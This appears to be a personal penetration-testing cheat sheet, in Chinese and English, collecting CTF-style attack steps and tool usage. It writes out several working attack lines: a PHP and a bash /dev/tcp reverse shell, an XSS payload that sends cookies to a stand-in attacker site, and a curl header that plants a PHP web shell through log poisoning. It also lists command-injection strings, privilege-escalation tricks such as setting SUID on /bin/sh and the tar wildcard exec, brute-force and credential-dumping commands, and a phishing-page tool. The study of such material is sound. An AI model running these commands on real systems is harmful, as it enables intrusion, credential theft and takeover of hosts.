Pentest CheatSheet & Learning
===

Directory
===
- [Steps](#Steps)
- [Tools](#Tools)
- [Common Attack Steps](#Common-Attack-Steps)
- [Others](#Others)

Helpful Resource
===
- [Ctf CheatSheet](https://github.com/w181496/Web-CTF-Cheatsheet)
- [Cyber Chef](https://gchq.github.io/CyberChef/)
- [hash db online - md5hashing](https://md5hashing.net/)
- [hash db online - md5decrypt](https://md5decrypt.net/en/)
- [reverse shell - pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [privilege escalation](https://gtfobins.github.io/)
- [Exploit-db](https://www.exploit-db.com/)

Learning Resource
===
- DVWA
- XVMA
- Mutillidae
- JuiceShop
- VulnBank
- Tryhackme
- WebGoat
- HackTheBox

# Common Attack Steps
1. 用 `nmap` 掃描開啟的 port 與服務
2. 根據服務版本:
    - 攻擊公開漏洞(CVE)
    - 攻擊錯誤設定
    - 常見的脆弱服務
        1. FTP
        `ftp <ip>`
        2. NFS
        `showmount -e <ip>`
        `mount <ip>:/path /local/path`
        `unmount /local/path`
        3. MYSQL
        4. smb
            1. 用 enum4linux 找 smb info
            2. 用 nmap 找 share file info
                - `nmap -p <port> --script=smb-enum-shares.nse,smb-enum-users.nse <ip>`
            3. access share folder
                ```shell
                smbclient //10.10.32.206/<share_path>
                ```
        5. nfs
            - 可以先用 nmap 找 rpcbind 是否有 NFS server
            - 看 mount info
                - `showmount -e <ip>`
3. web-server
    - dirsearch
4. get shell
    - 可以用的 command, ex:
        - curl
        - wget
        - 等等
    - 想盡辦法生出 reverse-shell file
    - php reverse-shell
        ```php
        $sock = fsockopen("10.0.0.1",1234);
        exec("cmd.exe <&3 >&3 2>&3"); // windows
        exec("/bin/bash -i <&3 >&3 2>&3"); // linux
        ```
5. 當有了 shell
    - `id`
    - `cat /etc/password`
    - `hostname`
6. king of the hill
    - `export term=xterm`
        - 解決 vim 無法使用的問題
    - `stty raw -echo`
        - 使 tty 不會 repeat echo
    - `lsof -P -i -n` (list of open file)
        - 列出當前使用中的 port
    - /etc/ssh/sshd_config
    - `chattr +i <file>`
        - 為 file 加上 immutable 的 attribute
        - `lsattr` 可以列出 attribute
        - 可以再 `rm which chattr` 達到 combo
    - `ps aux | grep pts`
        - 列出當前有使用的 pts
    - `while :; do echo "kotH" > king.txt; done`
        - 印東西的腳本
    - `who`
        - 查看 username and pty
    - `touch /etc/nologin`
        - 禁止除了 root 以外的使用者登入, 並回傳 nologin 內容
        - 移除 nologin 即可取消

# Tools
> 常用工具
- linux command
    - `find / 2>>/dev/null | grep <filename_you_want>`: 從 / 找特定檔案
    - `find / 2>>/dev/null | grep -i <filename_you_want>`: 檔名大小寫無關
- nmap
    - [link](https://kknews.cc/zh-tw/code/34np938.html)
    - 掃 port
    ```shell
    ## -SU UDP scanning
    ## -sT is a TCP connect scan(which is the same as the 3 way handshake). It uses this to check if the port is open
    ## -sS is a TCP stealth scan which only sends one packet to see if the TCP port is open
    ## -p port-number is used to specify what port to scan:
    ## -p- can also be used to scan all the ports
    ## -F is a common flag used to specify the top 250 common ports
    ## -O is used to determine the host operating system
    ## -sC is used to run default scripts. NMAP has particular scripts it can run against services running on hosts to gain more information
    ## -sV is used to determine the versions of services running on open ports
    ## -T is used to specify the timing with 1 being the slowest and 5 being the fastest. The faster the scan, the more unreliable the results. A good compromise is 3
    ## -Pn: only scan if service
    ## -oA is used to store the output in all the formats provided by nmap
    ## .nmap
    ## .gnmap
    ## .xml
    ## -oN <file>:  Output scan in normal format to the given filename
    ## -p-: all port
    ## ---------
    
    # example
    nmap -sT -p <port-number> -O -sC -sV -T[1-5] -oA <output-file-name> <ip-address>
    
    # john hammond recommand
    nmap -sC -sV -oN nmap/initial ip
    
    # vuln script
    ## /usr/share/nmap/scripts 下有所有可用的 script
    nmap -sV -vv --script=vuln -oN nmap.log 10.10.242.151 ## 看有沒有相關服務的漏洞
    nmap -sV -vv --script=sub* -oN nmap.log 10.10.242.151 ## 只看相關的漏洞
    
    
    # my options
    nmap -p 1-3306 -T4 -sC -sV -O -oN l1nmap.log ip
    nmap -p 3307-10000 -T5 -sC -sV -O -oN l2nmap.log ip
    
    ```
- dirsearch
    - [link](https://github.com/maurosoria/dirsearch)
    - 掃dir
    ```shell
    ## python3 dirsearch -u <URL> -e <ext>
    
    python3 dirsearch -u 192.168.1.1 -e *
    ```
- hydra
    - [link](https://github.com/vanhauser-thc/thc-hydra)
    - [tutorial](https://blog.tryhackme.com/hydra/)
    - brute-force
    ```shell
    ## hydra -L <USER> -P <Password> <IP Address> -s <PORT> http-post-form "<Login Page>:<Request Body>:<Error Message>"
    ## Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP,  HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP
    
    hydra -L usernames.txt -P passlist.txt 10.10.226.189 -s 3000 http-post-form "/sysadmin:username=^USER^&password=^PASS^:login failed:H=Cookie: PHPSESSION=<value>"
    
    hydra -l user -P password.txt ftp://<ip>
    
    hydra -l user -P password.txt ip -t 4 ssh
    
    ## json
    hydra -l user -P password.txt ip http-post-form '/api/login:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:F=failed message:H=Accept: */*:H=Content-Type: application/json'
    ```
- wpscan
    - [link](https://github.com/wpscanteam/wpscan)
    - WordPress Security Scanner
    - 單純掃 wp 會比 hydra 快很多
    ```shell
    wpscan --url <url> --usernames <name_file or name> --passwords <password_file or password>
    ```
- enum4linux
    - `apt install enum4linux`
    - samba scanning
    ```shell
    ## -U: userlist
    ## -o: OS info
    ## -a: all
    enum4linux -a 192.168.1.1
    ```
- metasloipt
    - [link](https://github.com/rapid7/metasploit-framework)
    - [tutorial for meterpreter](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
    - [tutorial for meterpreter2](https://www.bodkin.ren/index.php/archives/458/)
    - [tutorial for meterpreter3](https://xz.aliyun.com/t/2536)
    - 初始化 DB `msfdb init`
    - a penetration testing framework
    ```shell
    # exploit vs aux module
    ## exploit need associated payload
    ## aux don't
    
    # meterpreter shell
    ## Meterpreter is metasploits own "control center" where you can do various things to interact with the machine.
    ## post/multi/manage/shell_to_meterpreter
    download <file>
    upload <src_file> <dst_file>
    shell ## create shell
    execute <command>
    search <file>
    background ## put meterpreter shell to background
    
    ## -j: exploit to run in the background
    
    msfconsole
    msf5> search <module>
    msf5> use <module>
    msf5> info
    msf5> show options
    msf5> show payloads
    msf5> set option value
    msf5> set PAYLOAD <payload_name>
    msf5> run
    msf5> sessions -i <session_number> ## interact with session number
    msf5> sessions -u <session_number>## Escalate privileges
    msf5> sessions -k <session_number>
    msf5> migrate -N <process_name> (ex. winlogon.exe) ## migrate meterpreter to another process
    msf5> db_nmap -sV <IP> ## nmap

    ## module
    auxiliary/scanner/<service>/<use> ## brute-force service
    
    ## get meterpreter
    msf5> use exploit/multi/handler
    msf5> background
    msf5> use multi/manage/shell_to_meterpreter ## and SESSION
    
    ## powerful module
    unix/webapp/wp_admin_shell_upload ## get wp admin and generate reverse shell
    
    ## powerful payload list
    multi/http/tomcat_mgr_upload ## tomcat upload file
    scanner/http/tomcat_mgr_login ## tomcat login
    
    ## hide
    # use windows spoolsv.exe to hide
    meterpreter> migrate <pid>
    meterpreter> getuid
    meterpreter> sysinfo
    meterpreter> load kiwi ## great post-exploitation tool
    meterpreter> run post/windows/gather/checkvm ## check if vm
    meterpreter> run post/multi/recon/local_exploit_suggester ## suggestions priv escalation
    meterpreter> run post/windows/manage/enable_rdp ## get rdp
    meterpreter> use priv
    
    ## Mimikatz is a rather infamous password dumping tool
    meterpreter> load kiwi
    meterpreter> creds_all
    meterpreter> screenshare
    
    ## 
    
    ```
    - ![](https://i.imgur.com/P6WU38u.png)
        - `msf5> load` for load module
        - diff types module
            1. exploit: holds all of exploit code
            2. payload: contains the various bits of shellcode we send to have executed following exploitation
            3. auxiliary: scanning and verification machines are exploitable
            4. post: after exploitation, it can loot and pivot
            5. encoder: modify 'appearance' of exploit that avoid signature detection
            6. NOP: use for buffer overflow and ROP attack
- linpeas
    - [link](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
    - privilege-esccalation
    ```shell
    ## /dev/shm 為 tmpfs 的裝置
    ./linpeas.sh
    ```
- john the ripper
    - [link](https://www.openwall.com/john/)
    - `apt install john`
    - crack password
        - ssh (use for id_rsa)
        ```shell
        ## package path: `/usr/share/john/ssh2john.py`
        
        ## --format=<hash_mode> ex. raw-md5, raw-sha1
        ## --wordlist=<wordlist_path>
        
        # 要用 sudo 跑
        
        ```
- hashcat
    - [link](https://github.com/hashcat/hashcat)
    - [hash example](https://hashcat.net/wiki/doku.php?id=example_hashes)
    - [online crachhash](https://crackstation.net/)
    看 hash 開頭分析是哪種 hash 方式
    ex. `$6$ => SHA512`
    - `apt install hashcat`
    - [tutorial](https://www.bodkin.ren/index.php/archives/315/)
    - crack hash password
    ```shell
    ## -a --attack-mode : 0 -> Straight
    ## -m --hash-type
    ## --force: ignore warning
    ## 1800: sha256 (unix)
    ## 500: md5 (unix)
    hashcat -m 1800 -a 0 -o result.log <hash.txt> <rockyou.txt>
    ```
- hashcat-util
    - [link](https://github.com/hashcat/hashcat-utils/releases)
    - 一些可以產生 rule, wordlist 的工具
    ```shell
    ./combinator.bin <wordlist1> <wordlist2> > <mywordlist>
    ```
- wireshark
    - right click package, select `Follow TCP Stream`:
        - applies a display filter which selects all the packets in the current stream
        - show 出整個 tcp stream 所有的資訊
    - File -> Export Objects -> HTTP -> save all
        - 將檔案萃取出來
    - Statistic -> conversation
        - 查看所有封包的溝通
    - filter
        - `frame contains "import"`
            - 取得 package that content 包含 import 字串
        - `tcp.port == 33`
        - `id.addr == 10.10.10.10`
    - right click -> decode as
        - 可以用不同的 protocol 來分析
    - telephony (menu item) 可以解析影音傳送的 protocol 來產生影音
- sha1sum
    - 求 sha1sum 的 hash value
    ```shell
    sha1sum <file>
    ```
- exiftool
    - `apt install exiftool
    - reading metadata on files
    ```shell
    exiftool <img_file>
    ```
- wayback machine
    - [link](https://web.archive.org/)
    - 網站時光機，可以瀏覽網站以前的模樣
- xxd
    - 將 hex 轉成 bin or ascii
    ```shell
    echo <hex_value> | xxd -r -p
    ```
-  steghide
    -  [tutorial](https://www.itread01.com/content/1541878342.html)
    - ` apt install steghide`
    - 將隱寫的資料找出
    ```shell
    steghide extract -xf <file>
    ```
- zsteg
    - `gem install zsteg`
    - zsteg : png == steghide : jpg
    ```shell
    zsteg <filename>
    ```
- stegoveritas
    - `pip3 install stegoveritas`
- fcrackzip
    - `apt install fcrackzip`
    - 暴力破解 zip
    ```
    fcrackzip -b --method 2 -D -p ~/wordlist/rockyou.txt -v <file_name>
    ```
- netcat
    - ` apt install netcat`
    - 暫時的 listening 模式
    ```shell
    ## -l : listen
    ## -v : verbose
    ## -n : numeric-only IP addresses
    ## -p : port
    nc -lvnp 80
    ```
- sqlmap
    - `git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev`
    - [tutorial](https://www.itread01.com/content/1549702982.html)
    - [sql injection cheat sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
    - 偵測是否有 sql injection 的漏洞
    ```shell
    ## -u <url>
    ## -r <raw_file>
    ## -p <parameter> ex. "id,user,password"
    ## --level=<level>
    ## --dbms <db_type> ex. "Mysql"
    # --batch : 全部默認 (good)



    ## 當前 db
    python3 sqlmap.py -r <xml_file> --current-db
    
    ## list all db
    python3 sqlmap.py -r <xml_file> --dbs -batch
    
    ## 指定 database 找 table
    python3 sqlmap.py -r <xml_file> -D <db_name> --tables --batch
    
    ## 指定 db & table 找資料
    python3 sqlmap.py -r <xml_file> -D <db_name> -T <table_name> --dump
    
    ## 以上所有
    python3 sqlmap.py -r <xml_file> --dump-all
    
    ## 查看 payload
    python3 sqlmap.py -u <url> --forms --batch --dump-all -v 3
    ```
- burpsuite
    - 可以攔截封包資訊，在做出不同的操作
    - [tutorial](https://blog.tryhackme.com/setting-up-burp/)
- searchsploit
    - a command line search tool for Exploit-DB
    - `apt update && apt -y install exploitdb`
    - [tutorial](https://www.exploit-db.com/searchsploit)
- meterpreter
    - [tutorial](https://paper.seebug.org/29/)
    - escalate privilege shell
    ```shell
    ## Dump all of the passwords on the machine as long as we have the correct privileges to do so
    hashdump
    ## search file
    search -f
    ```
- nikto
    - Nikto is a Perl based open-source web vulnerability scanner that can unearth every other potential threat on your web server including but not limited to
    - `apt-get install nikto -y`
    - ![](https://i.imgur.com/B9D9PA0.png)
    - [tutorial](https://www.mankier.com/1/nikto)
    ```shell
    ## -h: host
    nikto -h <url> 
    ```
- gobuster
    - 比 dirsearch 更靠普...
    - Gobuster is a tool used to brute-force:
        - URIs (directories and files) in web sites
        - DNS subdomains (with wildcard support)
        - Virtual Host names on target web servers
    - [link](https://github.com/OJ/gobuster)
    ```shell
    ## -x: extension
    ## -w: wordlist
    ## -U: username
    ## -P: password
    ## -k: skip ssl
    ## -H: headers
    ## --timeout: sec
    
    # 有時候會因為掃到較大的檔案而噴 timeout error, 所以要把 timeout 設大一點
    gobuster dir -u <url> -w <wordlist> --timeout 30s -x "zip,php,html"
    
    ## common.txt => 檔案
    ## dir => 路徑
    ## usernames.txt => 使用者
    ## rockyou.txt => 密碼
    ## brute force 時, 使用者通常都用小寫
    ```
- hash-identifier
    - 分析 hash 種類
    - `apt install hash-identifier`
    ```shell
    hash-identifier
    ```
- smbmap
    - allows users to enumerate samba share drives across an entire domain
    - [link](https://github.com/ShawnDEvans/smbmap)
    ```shell
    ## -u: username
    ## -p: password
    ## -H: host
    ## -x: run command on server
    smbsql -u "admin" -p "password" -H 10.10.10.10 -x "ipconfig"
    ```
- binwalk
    - [link](https://github.com/ReFirmLabs/binwalk)
    - Binwalk is a fast, easy to use tool for analyzing, reverse engineering, and extracting firmware images
    - `sudo apt install binwalk`
    - extract 出圖片 or 壓縮檔
    ```shell
    ## Extract <type> signatures, give the files an extension of <ext>, and execute <cmd>
    binwalk --dd='.*' <file>
    ## Automatically extract known file types
    binwalk -e <file>
    ```
- http server
    - 可以暫時開啟一個 http.server, 用於傳輸檔案或是得到 xss 的 cookies
    ```shell
    python -m http.server
    ```
    - source 如下
    ```python
    import http.server
    import socketserver

    PORT = 8000

    Handler = http.server.SimpleHTTPRequestHandler

    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print("serving at port", PORT)
        httpd.serve_forever()
    ```
- shodan
    - autonomous system number (ASN) is a global identifier of a range of IP addresses
        - 像是 google 的 ASN 為 `AS14061`, 可以在網路上找到他所擁有的 IP range
    - 而 shodan 能夠藉由搜尋所有的 ASN, 紀錄開啟的服務
    - filter
        - `ASN:<ASN_number>`
        - `port:<port_number>`
        - `product:<product_name> ex.mysql, nginx`
        - `Server:<server_name> ex. Server: SQ-WEBCAM`
        - City
        - Country
        - Geo (coordinates)
        - Hostname
        - net (based on IP / CIDR)
        - os (find operating systems)
        - port
        - before/after (timeframes)
- tineye
    - 用於 reverse image search
    - reverse image search 能夠找到相似圖片 or 圖片的相關訊息
    - [tineye](https://tineye.com/)
    - [Yandex](https://yandex.com/)
- Sublist3r
    - a fantastic python script that allows us to perform quick and easy recon(reconnaissance) against our target, discovering various subdomains associated with the websites/domains in scope
    ```shell
    python3 sublist3r.py -d <domain> -e <engine> -o <output_file> -T <thread_num> [-b]
    ```
- pgp&gpg&asc
    - pgp (Pretty Good Privacy)：利用 public/private keys 加解密
    - gpg 是用來加密解密的軟體
        - GPG can open and decrypt files encrypted by PGP or Open PGP
    - asc： an ASCII-armored representation of key material (or a signature)
    - [tutorial](https://superuser.com/questions/46461/decrypt-pgp-file-using-asc-key)
    - [know](https://stackoverflow.com/questions/58929260/what-are-the-meaningful-differences-between-gpg-sig-asc)
    ```shell
    gpg2john <private_key_file>
    john <above_output> ## get passphrase
    
    gpg --import <private_key_file> ## and then enter passphrase
    
    gpg --decrypt file.pgp
    ```
- aircrack-ng
    - air\*系列
        - aircrack-ng：無線密碼破解
        - aireplay-ng：流量生成和客戶端認證
        - airodump-ng：資料包捕獲
        - airbase-ng：虛假接入點配置
    - 分析(攻擊)無線網路的軟體，能偵測package
    - 攻擊方法
        - [tutorial](https://www.itread01.com/content/1543852627.html)
        - WEP：解析大量封包，分析加密資訊並解密
        - WPA/WPA2：攔截 handshake 封包並 brute force
    - 指令
    ```shell
    ## 開啟 wlan0 的 monitor mode
    airmon-ng start wlan0 ## 會有 wlan0mon
    
    ## 用 monitor mode 的無線網卡抓封包
    airodump-ng wlan0mon
    
    # airodump-ng
    ## flag
    --bssid: 設 bssid <router_id>
    --channel: 設 channel
    -w <path>: write
    
    # aircrack-ng
    aircrack-ng -b <bssid> -e <essid> -w <wordlist>  <cap_file>
    ## use hashcat crack
    aircrack-ng -j <new_file> <file.cap>
    hashcat -m 2500 -o result.log <file> <rockyou.txt>
    ## flag
    -b <bssid>: bssid
    -e <essid>: essid
    -j <file>: cap => HCCAPX
    ```
- grep
    - 用 grep 撈特定 wordlist
    ```shell
    grep -x '.\{8,20\}' ## 長度 8-20
    grep -o '[^ ]*[a-z][^ ]*' ## 包含小寫
    grep -o '[^ ]*[A-Z][^ ]*' ## 包含大寫
    grep -o '[^ ]*[0-9][^ ]*' ## 包含數字
    grep -v '^[a-zA-Z0-9]*$' ## 包含特殊字元 ($為 end of line)
    ```
- awk
    - command
    ```shell
    awk 'length == 3' <file>
    ```
- sed
    - command
    ```shell
    sed 's/.*/PREFIX&SUFFIX/' file
    cat file | sed 's/.*/prefix&suffix/'
    ```
- HiddenEye
    - [link](https://github.com/DarkSecDevelopers/HiddenEye)
    - create a phishing page
- impacket
    - [link](https://github.com/SecureAuthCorp/impacket)
    - providing low-level programmatic access to the packets 
- kerbrute
    - [link](https://github.com/ropnop/kerbrute/releases)
    - A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication
    ```shell
    kerbrute userenum ## 
    ```
- pspy
    - [link](https://github.com/DominicBreuker/pspy)
    - Monitor linux processes without root permissions
    ```shell
    ./pspy
    ```
    
- CMS scanner
    - wordpress
        - [WPScan](https://github.com/wpscanteam/wpscan)
    - joomla
        - [joomscan](https://github.com/rezasp/joomscan)
        ```
        perl joomscan.pl <options>
        ```
    - Drupal
        - [droopescan](https://github.com/droope/droopescan)


# Others
- data exfiltration
    - ![](https://i.imgur.com/JJufauw.png)
    - the technique of transferring unauthorized data out of the network
    - 多出現於 DNS 封包分析 (UDP)
- privilege escalations
    - SUID/SGID/SBIT
        - ![](https://i.imgur.com/aOBglKB.png)
        - ![](https://i.imgur.com/LuYUMWG.png)
        - ![](https://i.imgur.com/18r8FQ8.png)
        - SUID (Set UID) (4)
            - 檔案在執行時，檔案的執行身分會暫時變為檔案持有者
        - SGID (Set GID) (2)
            - 檔案在執行時，檔案的有效群組會暫時變成該檔案的擁有群組
            - 設在目錄時，則該目錄的「擁有群組」會自動設定到其下所建立的檔案 (或子目錄)
        ```shell
        ## 存根目錄下找 root 的檔案，並且執行後擁有 root 權限
        ## -perm -4000: 4: SUID bit (or 寫成 -perm -u=s)
        ## -exec ls -ldb {} \; : execute ls -ldb
        find / -user root -perm -4000 -exec ls -ldb {} \;
        find <file_name> -exec cat {} \;
        ```
    - 程式漏洞
        - [link](https://gtfobins.github.io/)
        - 找可以用 root 跑的程式
        ```shell
        sudo -l
        ```
    - crontab
        - 在 cronjob 的腳本中加入指令, 等待 cronjob 被執行後, 即可提升權限
        - 直接提升 sh 權限
        ```shell
        chmod u+s /bin/sh
        /bin/sh -p ## do not drop privilege
        /bin/bash -p ## maintain privilege, too
        ```
        - user 有 sudo 權限
        ```shell
        user ALL=(root) NOPASSWD: ALL
        ``` 
    - /etc/update-motd.d/*
        - 控制 linux user welcome message
        - this file is run as root 
    - in docker group
        - 如果使用者在 docker group 內的話, 代表他可以使用 docker 的相關功能, docker 的 mount(volumes) 也可以使用
        - `docker run -v /root:/root it(or cat /root/root.txt)`
    - 如果 `https://gtfobins.github.io/` 有就用
        - 如果沒有，找各個服務的版本，並找 local privilege escalation
- ftp-anonymous
    - 將使用者名稱設為 anonymous, 即可輸入任意密碼登入
    ```shell
    ftp <ip>
    user> anonymous
    pass> any
    
    ## 連完後 mode 改成 passive
    passive
    
    ## 取得檔案
    get <file_name>
    ```
    - 也可以用 nc 連線
    ```shell
    nc <ip> <port>
    ```
- encryption
    - 對稱性
        - 鑰匙都用同一把
        - gpg
        ```shell
        gpg -c <data> ## 加密
        gpg -d <data.gpg> ## 解密
        ```
    - 非對稱性
        - 公鑰加密、私鑰解密
        - openssl
        ```shell
        ## 加密
        openssl rsautl -encrypt -pubin -inkey public.key -in <file.txt> -out encrypted
        ## 解密
        openssl rsautl -decrypt -inkey private.key -in <encrypted.txt> -out　file.txt
        ```
    - 檔案損毀
        - md5
        ```shell
        md5sum <file>
        ```
- LFI (local file injection)
    - 有著 `?include_file=<filename>` url, 修改 filename 的位置, 存取到隱密資料
    - %2F 可以繞過 url `/` 的跳脫
- XSS (cross-site scripting)
    - 透過 javascript, 將使用者資料導向自己的網站, 並從參數中獲得 cookies
    - 常見 payload
    ```javascript
    // 偷 cookies
    <script>window.location = ‘attacker-web-site.com/page?param=’ + document.cookie </script>
    ```
- reverse shell
    - [link](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- bbypass
    - php extension
        - .phtml, .php, .php3, .php4, .php5, .PHP
- crack windows password
    - `Windows SAM file`: 放 hash 過的 password
- tcp connect
    ```shell
    /bin/bash -i /dev/tcp/<ip>/<port> 0>&1
    ```
- get sudo
    - 將使用者加入到 sudo group
    ```
    usermod -aG sudo <user>
    ```
- 輸出檔案
    ```shell
    cat <filename>
    echo $(<<filename>)
    echo `<filename`
    while read line; do echo $line; done < <filename>
    grep . <filename>
    grep . -R
    more <filename>
    less <filename>
    head <filename>
    tail <filename>
    tac <filename>
    nl <filename> ## print + line
    ```
- PHP LFI
    - [LFI cheat sheet](https://highon.coffee/blog/lfi-cheat-sheet/#php-wrapper-phpfilter)
    - 透過網頁語法的設計不良
        ```php
        include("$file")
        ```
        造成惡意使用者若輸入如 `../../etc/passwd` 等檔案路徑當參數，則可以成功存取 local file
    - 若網站有擋路徑，也可以透過 php filter 得到網站 source code
    - 敏感資料
        1. `/etc/passwd` ==> 看哪些使用者
        2. log file
            - 若能用 LFI 的方式存取 log，可以在 header (EX. user-agent)內加入 php 語法，讓分析 log 時能當作 php code 分析
                ```shell
                curl -H "user-agent: <?php system(\$_GET['cmd']) ?>" $IP
                ```
            - [log injection](https://owasp.org/www-community/attacks/Log_Injection)
            - [link](https://blog.codeasite.com/how-do-i-find-apache-http-server-log-files/)
            - RHEL / Red Hat / CentOS / Fedora Linux Apache error file location
                - `/var/log/httpd/error_log` (ERROR)
                - `/var/log/httpd/access_log` (ACCESS)
            - Debian / Ubuntu Linux Apache error log file location
                - `/var/log/apache2/error.log` (ERROR)
                - `/var/log/apache2/access.log` (ACCESS)
            - FreeBSD Apache error log file location
                - `/var/log/httpd-error.log` (ERROR)
                - `/var/log/httpd-access.log` (ACCESS)
            - nginx log file location
                - `/var/log/nginx/error.log` (ERROR)
                - `/var/log/nginx/access.log` (ACCESS)
- Spawning a TTY Shell
    - 有時候因為 reverse shell 會 disable 一些東西, 像是 askpass (詢問密碼的 terminal) 等等, 導致功能不能用 ex. `sudo`, 所以要用其他方法在 remote 再生出一個完整的 shell
    ```shell
    ## python
    python -c 'import pty; pty.spawn("/bin/sh")'
    echo os.system('/bin/bash')
    ```
- steganography
    - 隱寫術, 將資料隱藏在圖片中
    - 常見
        - `diff`: 兩張圖片的比較(sub, add...)會產生圖片外觀的變化, 或是原始圖片資料中有其他資訊
        - `ext`: 圖片雖然在 .png .jpg 等等圖片副檔名中可以顯示圖片, 但是在更改成 zip, rar 等等壓縮副檔名後內部藏有其他資訊
        - `image`: 圖中圖, 需要利用 `binwalk` 等 tool 將圖片 extract 出來
        - `text`: text strings 直接被加在圖片中, 用 `strings` 查看
- networking
    - 網路化分的用途與方始
    - [tutorial](https://www.pcmag.com/news/the-abcs-of-ip-addresses)
- wifi
    - [tutorial](Wifi Hacking 101)
    - SSID(Service Set Identifier): network name
    - BSS(Basic Service Set)：一個 WIFI AP 與多個 WIFI 使用者的網路架構
    - BSSID(BSS Identifier)：WIFI AP 的 MAC address
    - ESSID(external SSID)：單個 SSID 可能應用在多個 access point(系館網路有多個 AP，但是都使用CSIE_WIFI 這個 SSID)
    - WAP(Wireless Access Point)：無線基地台
    - Captive Portal: WIFI認證頁面
    - 密碼
        - WEP
            - 過時&不安全
        - WPA/WPA2
        - WPA2-EAP(Extensible Authentication Protocol)：
            - 提供 username 與 password 給 radius server 做 authenticate
            - 所以要輸入"帳號&密碼"
        - WPA-PSK/WPA2-PSK
            - PSK(pre-shared key)
            - 兩種加密方式
                - TKIP
                    - 過時
                - AES(Advanced Encryption Standard)
                    - 比 TKIP 好
    - 演化：
        1. WEP
        2. WPA
            1. WPA
                - 加密
                    - TKIP
            2. WPA2
                - 用 the 4 way handshake authencation
                - ![](https://i.imgur.com/2lWlfcn.png)
                - 加密
                    - AES
                    - TKIP
            - mode
                - 普通：
                - PSK：密碼8個，手機常用 (又稱 WPA2-Personal)
                - EAP：要用 username&password 跟radius認證
- php cmd
    - `system()`: Execute an external program and display the output
        - string system ( string $command [, int &$return_var ] )
    - `exec()`: Execute an external program
        - string exec ( string $command \[, array &$output \[, int &$return_var \]\] )
    - `shell_exec()` — Execute command via shell and return the complete output as a string
        - string shell_exec ( string $cmd )
- command injection:
    - 若是程式有提供 command execution, 可以利用以下等等來執行指定 command
        1. \`ls\`
        2. ; ls -al
        3. $(ls -al)
        4. & ls -al
        5. ${IFS} ## 取代 space
- apktool
    - 逆向 apk 的工具
    - [install](https://ibotpeaches.github.io/Apktool/install/)
        ```shell
        apktool d file.apk -o <out_dir>
        ```
- other
    - login
        - `ssh -i id_rsa <user>@<ip>` 直接用 private key 登入
        - ssh-keygen 一組 public key, 再將 key 加到 `/home/user/.ssh/authorized_keys`
    - image header
        - jpg
            ```
            FF D8 FF E0 00 10 4A 46 49 46
            ```
        - png
            ```
            89 50 4A 47 0D 0A 1A 0A
            ```
    - privilege escalation
        - `/etc/shadow`
            - 只可讀 => john or hashcat
            - 可寫 => `mkpasswd` 蓋掉
        - `/etc/passwd`
            - 可寫
        - shared library
            - ![](https://i.imgur.com/IH1teVL.png)
            - program 必須是 root 執行
            - 用 `ldd` 或 `strace` 查看是否有 missing lib, 再用 malicious lib 去 exploit
                - `LD_LIBRARY_PATH` 可以指定 library loading 的優先順序, 但是對 sudo 沒有效果
                - `-rpath` 為 compile 時下的參數, 可以指定 library path
        - `/bin/bash`
            - version < 4.2-048
            - 可以定義 shell function, 而在執行 command 時會先查看是否為 function, 而若 function name 跟 ELF 的路徑一樣, 則會先被執行
                ```shell
                function /usr/local/ELF {/bin/bash;}
                export -f /usr/local/ELF
                ```
        - `LD_PRELOAD, LD_LIBRARY_PATH`
            - `LD_PRELOAD` loads a shared object before any others when a program is run
            - `LD_LIBRARY_PATH` provides a list of directories where shared libraries are searched for first
            - 利用`LD_PRELOAD` or `LB_LIBRARY_PATH`,  在執行時指定 malicious path or so_file 取得 root shell
        - Wildcards
            - 在 script 中, 若有使用到 \* (wildcard), 則須注意檔案名稱, 若檔案名稱剛好為指令參數名稱, 則會當作名稱執行
            - example
                ```shell
                cd /home/user
                tar czf /tmp/backup.tar.gz *
                ## In /home/user/
                --checkpoint=1
                --checkpoint-action=exec=/bin/bash
                ```
            - 在執行時就會視為 `tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=/bin/bash`
- Unicode Zero-Width Characters steg
    - [tool](https://330k.github.io/misc_tools/unicode_steganography.html)
    - 利用 zero-wight 不可視的空白與分開隱寫內容 01 組合來做隱寫
        - &#x200c non-joiner
        - &#x200c joiner
- capabilities
    - 為 thread attribute
    - 由於程式的某些區塊需要 root 權限, 但設置 SUID 又會給予太大的權限, 所以可以透過 capabilities 設置部分功能擁有 root 權限
    - 利用 `setcap` 設置, `getcap` 查看
        - capability 為執行程式時擁有的能力 (如可以設置 uid `cap_setuid` 
        - ![](https://i.imgur.com/zpS7Faj.png)
        - e.g. `cap_net_raw+ep`
            - `cap_net_raw`: capability
            - `+`: 啟用 (`-`禁用)
            - `e`: 使否激活
            - `p`: 是否允許 process 設置
            - `i`: child process 是否繼承
        - 利用 capability 做 PE
            1. 找可以利用的 program
                - `getcap -r / 2>/dev/null`
            2. setuid in runtime
                - if python: `import os; os.setuid(0); os.system("/bin/bash")`
                - if perl: `use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";`